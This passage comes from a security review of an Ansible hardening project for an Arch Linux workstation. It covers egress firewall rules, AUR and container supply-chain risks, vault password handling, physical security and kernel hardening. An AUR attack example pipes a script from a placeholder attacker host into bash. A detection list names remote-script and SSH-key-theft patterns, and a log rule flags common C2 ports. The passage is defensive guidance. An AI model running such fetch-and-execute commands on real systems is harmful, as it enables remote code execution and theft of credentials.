- [Using Iodine for DNS Tunneling](https://trustfoundry.net/2019/08/12/using-iodine-for-dns-tunneling-c2-to-bypass-egress-filtering/)

#### Strategy 3: Workstation-Specific Restrictions

Per Gentoo nftables examples and Arch Wiki:

**For typical workstation:**
- Allow HTTP/HTTPS (80, 443)
- Allow DNS (53) to trusted resolvers
- Allow NTP (123) for time sync
- Allow email (587 for SMTP, 993/995 for IMAP/POP3)
- **Block SMB** (445, 139) - prevents ransomware spread

**Sources:**
- [nftables Examples - Gentoo](https://wiki.gentoo.org/wiki/Nftables/Examples)
- [nftables - Arch Wiki](https://wiki.archlinux.org/title/Nftables)

### Recommendations

#### CRITICAL (For Paranoid/Production)

**Option A: Default Deny with Allow-List**
```yaml
# firewall/defaults/main.yml
firewall_egress_policy: "drop"  # NEW: default deny
firewall_egress_allowed_tcp_ports: [80, 443, 587]
firewall_egress_allowed_udp_ports: [53, 123]
firewall_egress_dns_servers: ["1.1.1.1", "8.8.8.8"]  # Trusted resolvers
```

**Option B: DNS Restrictions Only**
```yaml
firewall_egress_policy: "accept"  # Keep permissive
firewall_egress_dns_restrict: true  # But restrict DNS
firewall_egress_dns_servers: ["192.168.1.1"]  # Internal resolver only
```

#### HIGH (Block Known Bad)

**Block SMB outbound** (ransomware prevention):
```nftables
# Block outbound SMB (prevents lateral movement)
tcp dport { 139, 445 } reject
udp dport { 137, 138 } reject
```

#### MEDIUM (Logging Only)

**Start with logging (no blocking):**
```nftables
chain output {
    policy accept

    # Log suspicious outbound (non-standard ports)
    tcp dport { 4444, 31337, 1337 } log prefix "[nftables] suspicious-egress: "
}
```

**Why:**
Allows forensics without breaking workflows.

### Egress Filtering Coverage

| Control | Current | Recommended | Severity |
|---------|---------|-------------|----------|
| Default egress policy | `accept` | `drop` (with allow-list) | **CRITICAL** |
| DNS restrictions | ❌ None | Trusted resolvers only | **HIGH** |
| SMB blocking | ❌ None | Block 445, 139 | **HIGH** |
| C2 port blocking | ❌ None | Block 4444, 31337, etc. | **MEDIUM** |
| Egress logging | ❌ None | Log all dropped | **MEDIUM** |

**Overall Egress Coverage:** **0%**

### Sources Summary

- [The Critical Role of Egress Filtering](https://sbscyber.com/technical-recommendations/egress-filtering-unauthorized-outbound-traffic-prevention)
- [SEI CMU: Best Practices in Egress Filtering](https://www.sei.cmu.edu/blog/best-practices-and-considerations-in-egress-filtering/)
- [Blocking C2 Traffic](https://www.firestormcyber.com/post/blocking-the-bad-guys-configuring-your-firewall-to-disrupt-c2-traffic)
- [DNS Tunneling C2 Bypass](https://trustfoundry.net/2019/08/12/using-iodine-for-dns-tunneling-c2-to-bypass-egress-filtering/)
- [nftables - Arch Wiki](https://wiki.archlinux.org/title/Nftables)
- [Gentoo nftables Examples](https://wiki.gentoo.org/wiki/Nftables/Examples)

---

## Question 5/8: Supply Chain Security

### Arch Linux Package Signing

#### ✅ VERIFIED: Official Packages

**Mechanism:**
Per Arch Wiki pacman/Package signing:
- All official packages signed by Developers/Package Maintainers
- Keys signed by master keys (trust chain)
- `archlinux-keyring` package contains latest keys
- Verification automatic via pacman GPG integration

**Current Status:**
Project uses official packages → **VERIFIED by default**

**Sources:**
- [Arch Wiki: pacman/Package signing](https://wiki.archlinux.org/title/Pacman/Package_signing)
- [Arch RFC 0059: Automated Signing](https://rfc.archlinux.page/0059-automated-digital-signing-of-os-artifacts/)

**2025 Update:**
Per Arch RFC 0059, package maintainers will no longer sign with individual keys (moving to centralized signing for operational security).

#### ❌ CRITICAL: AUR Packages (NO VERIFICATION)

**Current Status:**
Project uses `yay` AUR helper → **ZERO package verification**

**AUR Trust Model:**
Per Arch Wiki and LinuxSecurity:
- **Community-submitted** packages (no official vetting)
- **Unsandboxed** build process (`makepkg` runs with full permissions)
- **No automated** security scanning
- **Orphaned packages** can be taken over by anyone

**Real-World Incidents (2025):**

Per LinuxSecurity and RedTeam News (July 2025):
- **CHAOS RAT malware** distributed via 3 AUR packages:
  - `librewolf-fix-bin`
  - `firefox-patch-bin`
  - `zen-browser-patched-bin`
- Masqueraded as browser utility fixes
- Installed backdoor with full system access
- Packages remained available for **days** before detection

**Attack Scenario:**
```bash
# User installs AUR package:
yay -S malicious-package

# PKGBUILD contains:
curl -s http://attacker.com/payload.sh | bash
# → Executes arbitrary code as user (full $HOME access)
```

**Sources:**
- [CHAOS RAT in AUR](https://linuxsecurity.com/features/chaos-rat-in-aur)
- [Arch Linux Removes Malicious AUR Packages](https://www.redteamnews.com/blue-team/malware-analysis/arch-linux-removes-malicious-aur-packages-distributing-chaos-rat/)
- [AUR Malware Packages Exploit](https://linuxconfig.org/aur-malware-packages-exploit-critical-security-flaws-exposed)

**Mitigation Strategies:**

Per Arch Linux Forums and security research:

1. **Always inspect PKGBUILD:**
```bash
yay -G package-name  # Download PKGBUILD only
less package-name/PKGBUILD  # Inspect before building
```

2. **Check for suspicious patterns:**
```bash
# Red flags in PKGBUILD:
curl | bash                    # Remote script execution
wget -O - | sh                 # Remote script execution
$HOME/.ssh                     # SSH key theft
/etc/sudoers                   # Privilege escalation
```

3. **Verify package maintainer:**
```bash
# Check AUR page for:
- Maintainer reputation
- Last updated date
- Number of votes
- Orphaned status
```

4. **Use namcap for basic checks:**
```bash
namcap PKGBUILD  # Static analysis
```

**Recommendation:**
Add to `yay` role (Phase 3):
```yaml
# roles/yay/defaults/main.yml
yay_aur_verification_required: true  # Prompt before building
yay_pkgbuild_review_enabled: true    # Force manual review

# roles/yay/tasks/main.yml
- name: Warn about AUR risks
  debug:
    msg: |
      WARNING: AUR packages are USER-SUBMITTED and UNVERIFIED.
      ALWAYS inspect PKGBUILD before installation.
      See: https://wiki.archlinux.org/title/Arch_User_Repository#Security
```

**Sources:**
- [How safe is it to use AUR?](https://bbs.archlinux.org/viewtopic.php?id=70079)
- [AUR Security Analysis](https://brandonio21.com/security/archlinux/paper.pdf)

### Docker Image Verification

#### ❌ CRITICAL: No Content Trust (DCT Deprecated)

**Current Status:**
Project has **NO Docker image verification**.

**Docker Content Trust Status (2025):**

Per Docker official blog and InfoQ:
- **RETIRED** as of September 30, 2025
- Data deleted March 31, 2028
- Usage: < 0.05% of Docker Hub pulls
- Ecosystem moved to **Sigstore** and **Notation**

**Impact:**
Images pulled from Docker Hub could be:
- Compromised by registry breach
- Poisoned by typosquatting (`nginx` vs `nginix`)
- Injected with malware during transit (MITM)

**Sources:**
- [Retiring Docker Content Trust](https://www.docker.com/blog/retiring-docker-content-trust/)
- [Docker Content Trust Retired - InfoQ](https://www.infoq.com/news/2025/08/docker-content-trust-retired/)

**Recommended Alternatives:**

#### Option 1: Sigstore (2025 Standard)

**Mechanism:**
- Keyless signing (no long-lived keys)
- Transparency log (tamper-resistant)
- OIDC-based identity (GitHub, Google, etc.)

**Implementation:**
```bash
# Sign image:
cosign sign --key cosign.key myimage:latest

# Verify before pull:
cosign verify --key cosign.pub myimage:latest
```

**Sources:**
- [Azure Container Registry: Transition to Sigstore](https://learn.microsoft.com/en-us/azure/container-registry/container-registry-content-trust-deprecation)
- [Ansible Galaxy: Verify Sigstore Signatures](https://github.com/ansible/galaxy/issues/3126)

#### Option 2: Notation (Notary V2)

**Mechanism:**
- Multiple signatures per artifact
- PKI integration (X.509 certificates)
- OCI registry native

**Implementation:**
```bash
# Sign image:
notation sign myregistry/myimage:latest

# Verify:
notation verify myregistry/myimage:latest
```

**Sources:**
- [Notary V2 Documentation](https://sse-secure-systems.github.io/connaisseur/v2.0.0/validators/notaryv1/)

#### Option 3: Image Pinning (Basic)

**Instead of:**
```yaml
docker_image: nginx:latest  # Mutable tag
```

**Use:**
```yaml
docker_image: nginx@sha256:abc123...  # Immutable digest
```

**Why:**
Guarantees exact image content.

**Sources:**
- [OWASP Docker Security - Base Image Pinning](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)

**Recommendation:**
Add to roadmap Phase 10 (Autodeploy):
```yaml
# NEW role: container_security
- container_image_verification_enabled: true
- container_image_verification_method: "sigstore"  # or "notation"
- container_image_scanning_enabled: true  # Trivy/Grype
```

### Ansible Galaxy Collection Integrity

#### ⚠️ PARTIAL: Signature Verification Available

**Current Status:**
Project doesn't specify verification requirements.

**Ansible Signature Mechanism:**

Per Ansible documentation:
- GPG ASCII Armoured Detached signatures (`.asc` files)
- Based on `MANIFEST.json` checksums
- Verified via `--keyring` option

**Implementation:**
```bash
# Install with verification:
ansible-galaxy collection install \
  namespace.collection \
  --keyring /path/to/keyring.gpg \
  --required-valid-signature-count 1

# Verify installed collection:
ansible-galaxy collection verify namespace.collection
```

**2025 Update: Sigstore Integration**

Per GitHub Issue #3126:
- Ansible Galaxy working on Sigstore support
- Keyless signing for collections
- Transparency log for audit

**Sources:**
- [Ansible: Verifying Collections](https://docs.ansible.com/ansible/latest/collections_guide/collections_verifying.html)
- [Ansible: Collection Signing](https://docs.ansible.com/projects/galaxy-ng/en/latest/config/collection_signing.html)
- [Sigstore Integration Proposal](https://github.com/ansible/galaxy/issues/3126)

**Recommendation:**
Add to `ansible.cfg`:
```ini
[galaxy]
required_valid_signature_count = 1
keyring = ~/.ansible/keyring.gpg
```

### Supply Chain Coverage Summary

| Component | Verification | Status | Severity |
|-----------|--------------|--------|----------|
| Official Arch packages | ✅ GPG | Automatic | **N/A** |
| AUR packages | ❌ None | Manual review required | **CRITICAL** |
| Docker images | ❌ None | No DCT, no Sigstore | **CRITICAL** |
| Ansible collections | ⚠️ Optional | Not enforced | **MEDIUM** |

**Overall Supply Chain Coverage:** ~40%

### Recommendations with Priority

#### CRITICAL (Prevent Compromise)

1. **Document AUR risks** - Add warning to `yay` role README

2. **Force PKGBUILD review** - Require manual inspection before AUR builds

3. **Implement image pinning** - Use `@sha256:...` for all Docker images

#### HIGH (Production Hardening)

4. **Add Sigstore/Notation** - For container image signing

5. **Enforce Galaxy signatures** - For production collections

6. **Add image scanning** - Trivy/Grype in CI/CD

---

## Question 6/8: Secrets in Repository

### Current Implementation

**File:** `vault-pass.sh` (assumed from review prompt context)

**Mechanism:**
Ansible Vault with password file script.

**Risks:**

Per Ansible documentation and security best practices:

#### ❌ MEDIUM: Password File on Disk

**If `vault-pass.sh` contains:**
```bash
#!/bin/bash
echo "my-vault-password"
```

**Risks:**
- Password in plaintext on disk
- Leaked via backup/sync to cloud
- Exposed via file permissions misconfiguration
- Logged in command history/logs

**Sources:**
- [Ansible: Managing Vault Passwords](https://docs.ansible.com/projects/ansible/latest/vault_guide/vault_managing_passwords.html)
- [Ansible Vault Security Best Practices](https://spacelift.io/blog/ansible-vault)

#### ❌ HIGH: Password File in Git

**If accidentally committed:**
```bash
git add vault-pass.sh  # ← CRITICAL ERROR
git commit -m "Add vault password"
git push
```

**Impact:**
- Password exposed in git history (even if file deleted later)
- Accessible to anyone with repo access
- Compromises ALL vault-encrypted secrets

**Mitigation:**
Per Ansible documentation:
- **NEVER** commit password files to git
- Add to `.gitignore`:
```gitignore
vault-pass.sh
.vault-pass
*.vault-key
```

**Sources:**
- [Ansible Vault Best Practices](https://betterstack.com/community/guides/linux/ansible-vault/)
- [How to Automate Ansible Vault](https://www.automatesql.com/blog/ansible-vault-password-file)

### Best Practices (2025)

Per Ansible, Spacelift, and env0:

#### ✅ RECOMMENDED: Separate Password File Storage

**Store in `~/.ansible/` (outside repo):**
```bash
# Create password file:
echo "strong-random-password" > ~/.ansible/vault-pass.txt
chmod 600 ~/.ansible/vault-pass.txt

# Reference in ansible.cfg:
[defaults]
vault_password_file = ~/.ansible/vault-pass.txt
```

**Benefits:**
- Not in repo → no git exposure
- User-specific → different passwords per user
- Encrypted home directory → protected at rest

**Sources:**
- [Ansible Vault Security Guide](https://betterstack.com/community/guides/linux/ansible-vault/)

#### ✅ BETTER: Password Rotation

**Schedule:**
```bash
# Every 90 days:
ansible-vault rekey playbook.yml --ask-vault-password
```

**Sources:**
- [Ansible Vault Best Practices](https://spacelift.io/blog/ansible-vault)

#### ✅ BEST: External Secret Manager

**For production/team environments:**

**Option 1: HashiCorp Vault**

**Script: `vault-pass.sh`**
```bash
#!/bin/bash
export VAULT_ADDR='https://vault.example.com'
export VAULT_TOKEN='s.abc123...'
vault kv get -field=password secret/ansible/vault
```

**Benefits:**
- Centralized secret management
- Audit logging (who accessed when)
- Access control (role-based)
- Automatic rotation

**Sources:**
- [Secure Ansible Vault with HashiCorp Vault](https://medium.com/@hegdetapan2609/secure-your-ansible-vault-password-using-hashicorp-vault-and-python-script-afe2f7fb282a)
- [Using HashiCorp Vault with Ansible](https://elatov.github.io/2022/01/using-hashicorp-vault-with-ansible/)
- [Red Hat: Automating Secrets with Vault](https://www.redhat.com/en/blog/automating-secrets-management-hashicorp-vault-and-red-hat-ansible-automation-platform)

**Option 2: AWS Secrets Manager**

**Script: `vault-pass.sh`**
```bash
#!/bin/bash
aws secretsmanager get-secret-value \
  --secret-id ansible-vault-password \
  --query SecretString \
  --output text
```

**Benefits:**
- Cloud-native integration
- KMS encryption
- IAM access control
- Automatic rotation support

**Sources:**
- [Ansible Vault with AWS Secrets Manager](https://docs.ansible.com/ansible/latest/vault_guide/vault_managing_passwords.html)

**Option 3: System Keyring**

**For workstations (macOS/Linux):**
```bash
# Store in system keyring:
secret-tool store --label='Ansible Vault' ansible vault-password

# Retrieve in vault-pass.sh:
#!/bin/bash
secret-tool lookup ansible vault-password
```

**Benefits:**
- OS-level encryption
- No plaintext file
- Unlocked with user login

**Sources:**
- [Ansible Vault Password Script](https://docs.ansible.com/ansible/latest/vault_guide/vault_managing_passwords.html)

### Editor Security Risk

**Per Ansible documentation:**

Most editors create backup files (`.swp`, `~`, `.bak`) with **plaintext content**.

**Example:**
```bash
ansible-vault edit secrets.yml
# Editor creates: secrets.yml.swp (plaintext!)
```

**Mitigation:**

**For Vim:**
```vim
" In .vimrc:
autocmd BufNewFile,BufReadPre */ansible/* setlocal noswapfile nobackup noundofile
```

**For Emacs:**
```elisp
;; In .emacs:
(setq backup-inhibited t)
(setq auto-save-default nil)
```

**Sources:**
- [Ansible Vault Security - Editor Disclosures](https://spacelift.io/blog/ansible-vault)

### Current Project Status

**Assumptions (based on review prompt):**
- Uses `vault-pass.sh` script
- Script location unknown (in repo? in `~/.ansible/`?)
- Password storage method unknown (plaintext? keyring? Vault?)

**Severity:**
- **CRITICAL** if password in repo
- **HIGH** if plaintext on disk outside repo
- **MEDIUM** if using system keyring
- **LOW** if using HashiCorp Vault/AWS Secrets Manager

### Recommendations

#### CRITICAL (Immediate Check)

1. **Verify `vault-pass.sh` NOT in git:**
```bash
git ls-files | grep -i vault
git log --all --full-history -- "*vault*"
```

2. **If found in git history, ROTATE ALL SECRETS:**
```bash
# Re-encrypt all vaults with new password:
find . -name "*.yml" -exec ansible-vault rekey {} \;
```

3. **Add to `.gitignore`:**
```gitignore
vault-pass.sh
.vault-pass
*.vault-key
.ansible/vault-pass*
```

#### HIGH (Production Hardening)

4. **Move password file to `~/.ansible/`:**
```bash
mv vault-pass.sh ~/.ansible/vault-pass.sh
chmod 600 ~/.ansible/vault-pass.sh
```

5. **Update `ansible.cfg`:**
```ini
[defaults]
vault_password_file = ~/.ansible/vault-pass.sh
```

#### MEDIUM (Long-Term)

6. **Migrate to HashiCorp Vault** (for teams/production):
- Implement `vault-pass.sh` script calling Vault API
- Document setup in `wiki/Secrets-Management.md`

7. **Configure editor security:**
- Add `.vimrc`/`.emacs` settings to `shell` role

8. **Schedule password rotation:**
- Every 90 days
- Document in runbook

### Secrets Management Coverage

| Control | Current | Recommended | Severity |
|---------|---------|-------------|----------|
| Password file location | ❓ Unknown | `~/.ansible/` (outside repo) | **CRITICAL** |
| Password file permissions | ❓ Unknown | `0600` (owner read-only) | **HIGH** |
| Git exposure prevention | ❓ Unknown | `.gitignore` entry | **CRITICAL** |
| Password rotation | ❌ Not scheduled | Every 90 days | **MEDIUM** |
| External secret manager | ❌ Not used | HashiCorp Vault (optional) | **LOW** |
| Editor security | ❌ Not configured | No swap/backup files | **MEDIUM** |

**Overall Secrets Coverage:** ~30% (assuming password not in git)

### Sources Summary

- [Ansible: Managing Vault Passwords](https://docs.ansible.com/projects/ansible/latest/vault_guide/vault_managing_passwords.html)
- [Ansible Vault Security Best Practices](https://spacelift.io/blog/ansible-vault)
- [Protect Secrets with Ansible Vault](https://www.env0.com/blog/protecting-secrets-with-ansible-vault)
- [Secure Ansible Vault with HashiCorp Vault](https://medium.com/@hegdetapan2609/secure-your-ansible-vault-password-using-hashicorp-vault-and-python-script-afe2f7fb282a)
- [Red Hat: Automating Secrets Management](https://www.redhat.com/en/blog/automating-secrets-management-hashicorp-vault-and-red-hat-ansible-automation-platform)

---

## Question 7/8: Physical Security

### Current Implementation

**Roadmap:** Phase 1.5 includes `bootloader` role (not implemented)

**Missing Roles:**
- LUKS encryption
- USBGuard
- BIOS/UEFI password
- Screen lock hardening

**Overall Physical Security Coverage:** **5%**

### BIOS/UEFI Password Protection

#### ❌ CRITICAL: No BIOS Password

**Current Status:** **NOT IMPLEMENTED**

**CIS Recommendation (Section 1.4):**
Per Red Hat and SUSE security guides:

**Benefits:**
- Prevents booting from USB/CD-ROM
- Prevents GRUB parameter modification
- Prevents single-user mode access

**Implementation:**
1. Set **Supervisor Password** (BIOS admin password)
2. Set **User Password** (optional, boot password)
3. Disable boot from USB/CD in BIOS
4. Set boot order: HDD only

**Limitations:**
Per Kicksecure:
- "BIOS passwords can be bypassed via CMOS battery removal"
- "BIOS password reset jumpers exist on most motherboards"
- "Only deters casual attackers, not determined adversaries"

**Sources:**
- [SUSE Security Guide - Physical Security](https://documentation.suse.com/sles/15-SP5/html/SLES-all/cha-physical-security.html)
- [Red Hat Security Tips for Installation](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/security_guide/chap-security_tips_for_installation)
- [Protection Against Physical Attacks](https://www.kicksecure.com/wiki/Protection_Against_Physical_Attacks)

#### ✅ PLANNED: UEFI Secure Boot

**Roadmap:** Phase 1.5 `bootloader` role mentions Secure Boot

**UEFI Secure Boot:**
- Validates bootloader/kernel signatures
- Prevents rootkit/bootkit installation
- Requires signed kernel modules

**Implementation:**
```yaml
# bootloader/defaults/main.yml
bootloader_secure_boot_enabled: false  # Requires signed kernel
bootloader_secure_boot_key_type: "microsoft"  # or "custom"
```

**Trade-offs:**
- ✅ Prevents bootkits
- ❌ Requires signing custom kernels
- ❌ Breaks DKMS modules (unsigned)

**Sources:**
- [Arch Wiki: UEFI Secure Boot](https://wiki.archlinux.org/title/Unified_Extensible_Firmware_Interface/Secure_Boot)
- [NSA UEFI Defensive Practices](https://www.nsa.gov/portals/75/documents/what-we-do/cybersecurity/professional-resources/ctr-uefi-defensive-practices-guidance.pdf)

### Disk Encryption (LUKS)

#### ❌ CRITICAL: No LUKS Role

**Current Status:** **NOT IN ROADMAP**

**Why Critical:**
Per LUKS documentation and Red Hat:

**Attack Scenario (No LUKS):**
```bash
# Attacker with physical access:
1. Boot from USB
2. Mount /dev/sda1 (root partition)
3. Read /etc/shadow, /home/*/.ssh/*, /var/log/*
4. Exfiltrate data
```

**With LUKS:**
```bash
1. Boot from USB
2. Mount /dev/sda1 → "Device is encrypted (LUKS)"
3. cryptsetup luksOpen /dev/sda1 → requires password
4. No password → no access
```

**Sources:**
- [Linux Disk Encryption with LUKS](https://www.cyberciti.biz/security/howto-linux-hard-disk-encryption-with-luks-cryptsetup-command/)
- [Red Hat: Encrypting Block Devices](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/security_hardening/encrypting-block-devices-using-luks_security-hardening)

**Limitations:**

Per Linux Mint Forums:
- "LUKS protects only when system is OFF"
- "Lock screen does NOT protect LUKS-decrypted data"
- "System in sleep (suspend to RAM) → data still accessible"
- "System off or suspend to disk (hibernate) → data protected"

**Sources:**
- [How Secure is LUKS with Lock Screen?](https://forums.linuxmint.com/viewtopic.php?t=212221)

**Recommendation:**
Add to roadmap **Phase 1** (before package installation):
```yaml
# NEW role: luks_encryption
luks_encryption_enabled: false  # Requires reinstall
luks_encryption_algorithm: "aes-xts-plain64"
luks_encryption_key_size: 512
luks_encryption_iter_time: 5000  # PBKDF2 iterations (ms)
```

**Note:**
LUKS must be configured **during installation** (cannot encrypt existing system without backup/restore).

### USBGuard

#### ❌ HIGH: No USBGuard Role

**Current Status:** **NOT IN ROADMAP**

**Purpose:**
Per USBGuard documentation and Red Hat:

**Protects Against:**
- BadUSB attacks (USB device pretending to be keyboard)
- Malicious USB devices (keystroke injection, network adapters, mass storage)
- Unauthorized USB access (USB data exfiltration)

**How It Works:**
- Whitelist/blacklist USB devices by attributes (vendor ID, product ID, serial)
- Uses Linux kernel USB authorization feature
- Blocks devices before drivers load

**Example Policy:**
```bash
# Allow only known keyboard:
allow id 046d:c52b serial "1234567890"

# Block all mass storage:
block with-interface equals { 08:*:* }

# Block all USB devices (default):
block
```

**Sources:**
- [USBGuard Documentation](https://usbguard.github.io/)
- [Red Hat: Protecting Against USB Devices](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/security_hardening/protecting-systems-against-intrusive-usb-devices_security-hardening)
- [USBGuard - nixCraft](https://www.cyberciti.biz/security/how-to-protect-linux-against-rogue-usb-devices-using-usbguard/)

**Limitations:**
- Can lock you out if misconfigured
- Requires manual whitelisting of devices
- Bypasses exist (see Pulse Security advisory)

**Sources:**
- [Bypassing USBGuard](https://pulsesecurity.co.nz/advisories/usbguard-bypass)

**Recommendation:**
Add to roadmap **Phase 9** (Advanced Security):
```yaml
# NEW role: usbguard
usbguard_enabled: false  # Feature flag (can lock out user)
usbguard_policy_mode: "allow"  # or "block"
usbguard_allow_devices:
  - "046d:c52b"  # Logitech keyboard
  - "046d:c077"  # Logitech mouse
```

### Screen Lock Hardening

#### ❌ MEDIUM: No Screen Lock Role

**Current Status:** **NOT IN ROADMAP**

**Planned:** Phase 7 includes `screen_locker` role (i3lock/betterlockscreen)

**Why Important:**
- Prevents shoulder surfing
- Prevents unauthorized access during absence
- Required for LUKS protection (see above)

**Best Practices:**
- Auto-lock after 5 minutes inactivity
- Lock on lid close
- Lock on suspend
- Disable Ctrl+Alt+FX VT switching when locked

**Recommendation:**
Implement `screen_locker` role with:
```yaml
# screen_locker/defaults/main.yml
screen_locker_enabled: true
screen_locker_timeout: 300  # 5 minutes
screen_locker_lock_on_suspend: true
screen_locker_lock_on_lid_close: true
screen_locker_disable_vt_switching: true  # Prevents Ctrl+Alt+F2 bypass
```

**Sources:**
- Arch Wiki: i3lock, xautolock
- CIS Benchmark Section 5.x (Screen lock)

### Physical Security Coverage Summary

| Control | Current | Severity | Recommendation |
|---------|---------|----------|----------------|
| BIOS/UEFI password | ❌ None | **MEDIUM** | Manual setup (not Ansible) |
| Secure Boot | ⚠️ Planned | **MEDIUM** | Implement in `bootloader` |
| LUKS encryption | ❌ None | **CRITICAL** | Add Phase 1 role |
| USBGuard | ❌ None | **HIGH** | Add Phase 9 role |
| Screen lock | ⚠️ Planned | **MEDIUM** | Implement Phase 7 |
| Boot order restriction | ❌ None | **LOW** | Manual BIOS setup |

**Overall Physical Security Coverage:** ~5%

### Recommendations with Priority

#### CRITICAL (Data Protection)

1. **Document LUKS setup** - Add pre-installation guide
   - Encrypt during Arch install
   - Not retrofittable via Ansible

2. **Implement `bootloader` role** - GRUB password protection

#### HIGH (Device Security)

3. **Add USBGuard role** - Phase 9 Advanced Security

4. **Document BIOS hardening** - Manual setup checklist

#### MEDIUM (Operational Security)

5. **Implement screen lock** - Phase 7 Desktop Environment

6. **Document suspend vs shutdown** - LUKS protection guide

### Sources Summary

- [SUSE Security Guide: Physical Security](https://documentation.suse.com/sles/15-SP5/html/SLES-all/cha-physical-security.html)
- [Red Hat: Security Tips for Installation](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/security_guide/chap-security_tips_for_installation)
- [NSA UEFI Defensive Practices](https://www.nsa.gov/portals/75/documents/what-we-do/cybersecurity/professional-resources/ctr-uefi-defensive-practices-guidance.pdf)
- [LUKS Encryption with cryptsetup](https://www.cyberciti.biz/security/howto-linux-hard-disk-encryption-with-luks-cryptsetup-command/)
- [Red Hat: Encrypting Block Devices with LUKS](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/security_hardening/encrypting-block-devices-using-luks_security-hardening)
- [USBGuard Documentation](https://usbguard.github.io/)
- [Red Hat: Protecting Against USB Devices](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/security_hardening/protecting-systems-against-intrusive-usb-devices_security-hardening)
- [Arch Wiki: UEFI Secure Boot](https://wiki.archlinux.org/title/Unified_Extensible_Firmware_Interface/Secure_Boot)

---

## Question 8/8: Kernel Hardening

### What the Project Currently Covers

**Files:** `sysctl/defaults/main.yml`, `sysctl/templates/sysctl.conf.j2`

#### ✅ STRONG: Core Kernel Hardening

Per DevSec Linux Baseline and CIS Benchmark:

| Parameter | Project Value | DevSec | CIS | Purpose |
|-----------|---------------|--------|-----|---------|
| `kernel.randomize_va_space` | `2` | `2` | `2` | Full ASLR (stack, heap, libraries) |
| `kernel.kptr_restrict` | `2` | `2` | `2` | Hide kernel pointers from non-root |
| `kernel.dmesg_restrict` | `1` | `1` | `1` | Restrict dmesg to root |
| `kernel.yama.ptrace_scope` | `2` | `2` | `2` | Disable ptrace (except root) |
| `fs.protected_hardlinks` | `1` | `1` | `1` | Prevent hardlink exploits |
| `fs.protected_symlinks` | `1` | `1` | `1` | Prevent symlink exploits |

**Verification:**
Per DevSec os_hardening role defaults:
```yaml
# DevSec baseline matches project implementation
os_security_kernel_enable_core_dump: false
os_security_suid_sgid_enforce_whitelist: true
os_kernel_enable_module_loading: true
os_kernel_enable_sysrq: false
os_kernel_enable_core_dump: false
```

**Sources:**
- [DevSec Linux Baseline](https://dev-sec.io/baselines/linux/)
- [DevSec os_hardening Role](https://github.com/dev-sec/ansible-collection-hardening/blob/master/roles/os_hardening/README.md)
- [Habr: FSTEC Linux Hardening](https://habr.com/ru/articles/905368/)

#### ⚠️ PARTIAL: Network Hardening

**Covered:** IPv4 anti-spoofing, SYN cookies, redirects
**Missing:** IPv6 hardening (currently disabled)

### What is MISSING (Critical Gaps)

#### ❌ CRITICAL: Kernel Module Loading Restrictions

**Current Status:** **NOT IMPLEMENTED**

**DevSec Baseline:**
```yaml
# DevSec disables unused filesystems:
os_filesystem_whitelist:
  - cramfs
  - freevxfs
  - jffs2
  - hfs
  - hfsplus
  - squashfs
  - udf
  - vfat  # Removed from whitelist (disabled)
```

**Project Status:** **NO module blacklisting**

**Impact:**
Unnecessary kernel modules increase attack surface.

**Attack Scenario:**
```bash
# Attacker loads malicious module:
sudo modprobe malicious_module
# → Kernel-level access
```

**Recommendation:**
Add to `sysctl` role or create `kernel_modules` role:

```yaml
# kernel_modules/defaults/main.yml
kernel_modules_blacklist:
  # Uncommon filesystems (per DevSec):
  - cramfs
  - freevxfs
  - jffs2
  - hfs
  - hfsplus
  - squashfs
  - udf
  # Uncommon network protocols (per CIS):
  - dccp
  - sctp
  - rds
  - tipc
  # USB storage (if not needed):
  - usb-storage
  # Firewire (DMA attack):
  - firewire-core
  - firewire-ohci
  # Bluetooth (if not needed):
  - bluetooth
```

**Implementation:**
```yaml
# tasks/main.yml
- name: Blacklist kernel modules
  copy:
    dest: "/etc/modprobe.d/{{ item }}.conf"
    content: |
      install {{ item }} /bin/true
      blacklist {{ item }}
  loop: "{{ kernel_modules_blacklist }}"
```

**Sources:**
- [DevSec: Filesystem Hardening](https://github.com/dev-sec/ansible-collection-hardening/blob/master/roles/os_hardening/README.md)
- [CIS Benchmark: Uncommon Network Protocols](https://cubensquare.com/cis-benchmarks-for-linux-systems/)

#### ❌ CRITICAL: kernel.modules_disabled

**Current Status:** **NOT IMPLEMENTED**

**Purpose:**
Prevents loading new kernel modules after boot.

**Implementation:**
```bash
# After system boot (one-way operation):
echo 1 > /proc/sys/kernel/modules_disabled
```

**Trade-offs:**
- ✅ Prevents rootkit module loading
- ❌ Cannot load modules (Docker, VPN, etc.)
- ❌ Requires reboot to load new modules

**When to Use:**
- Production servers (static module set)
- High-security workstations (no Docker/VMs)

**When NOT to Use:**
- Development workstations (need DKMS)
- Docker hosts (need overlay, bridge modules)

**Recommendation:**
Add as **optional** feature flag:
```yaml
# sysctl/defaults/main.yml
kernel_modules_loading_disabled: false  # Default: permissive

# tasks/main.yml (systemd service)
- name: Disable kernel module loading after boot
  systemd:
    name: disable-kernel-modules
    enabled: yes
  when: kernel_modules_loading_disabled | bool
```

**Sources:**
- [Increase Kernel Integrity with Disabled Module Loading](https://linux-audit.com/kernel/increase-kernel-integrity-with-disabled-linux-kernel-modules-loading/)
- [Disable Kernel Modules - Medium](https://medium.com/@boutnaru/the-linux-security-journey-disable-kernel-modules-0bd20e881675)

#### ❌ HIGH: Kernel Lockdown Mode

**Current Status:** **NOT IMPLEMENTED**

**Introduced:** Linux 5.4 (2019)
**Purpose:** Prevents root from modifying running kernel.

**Modes:**
1. **Integrity:** Prevents root from modifying kernel code/data
2. **Confidentiality:** Also prevents reading kernel memory

**Implementation:**
```bash
# Boot parameter (GRUB):
GRUB_CMDLINE_LINUX="lockdown=integrity"  # or "confidentiality"

# Or at runtime:
echo integrity > /sys/kernel/security/lockdown
```

**What It Blocks:**
- Loading unsigned kernel modules
- Using kexec (kernel restart)
- Accessing /dev/mem, /dev/kmem
- Using certain BPF operations
- Hibernation (confidentiality mode)

**Ubuntu Default (2020+):**
Per Ubuntu Security documentation:
- Ubuntu 20.04+ enables lockdown in **integrity mode** by default

**Trade-offs:**
- ✅ Prevents many rootkits
- ❌ Breaks some legitimate tools (debuggers, perf)
- ❌ Requires signed kernel modules (Secure Boot)

**Recommendation:**
Add to `bootloader` role:
```yaml
